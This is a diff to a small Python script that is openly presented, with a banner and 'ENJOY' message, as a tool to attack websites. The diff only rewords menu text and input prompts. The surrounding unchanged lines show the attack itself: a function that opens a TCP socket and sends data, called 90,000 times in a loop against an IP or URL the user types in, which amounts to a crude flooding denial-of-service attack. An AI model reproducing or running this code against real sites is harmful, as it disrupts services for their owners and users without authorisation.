@@ -16,22 +16,21 @@ $$$$$$$  |$$$$$$  |$$$$$$  $$ | \_/ $$ |
 	     +   PRO!MIDO   +
 	     +              +
 	     ++++++++++++++++
-for using it ::
->>>>>>>>>>>>>>>>>>>>>>>	
+usage!
 chosse :
 if you want to attack website with ip
 [1]write >>  ip
 
 then ;
 enter the ip of website
------------------------
+=======================
 if you want to attack site with url
 
 [2]write >>  url
 then;
 enter the url of website
 
-ENJOY ........''')
+ENJOY ...!!''')
 
 def doss (url):
 	s = socket.socket(AF_INET,SOCK_STREAM)
@@ -42,13 +41,13 @@ def doss (url):
 	s.send(data)
 
 
-x = input ('[1] ip    $$     [2] url  :: ')
+x = input ('[1] ip    ==>     [2] url  :: ')
 if x == 'ip':
-	ip = input ('enter the ip of site :>> ')
+	ip = input ('[+] enter the ip of site ==> ')
 	for i in range (90000):
 		doss(ip)
 
 else:
-	url = input('enter the url of site :>> ')
+	url = input('[+] enter the url of site ==> ')
 	for i in range (90000):
 		doss(url)
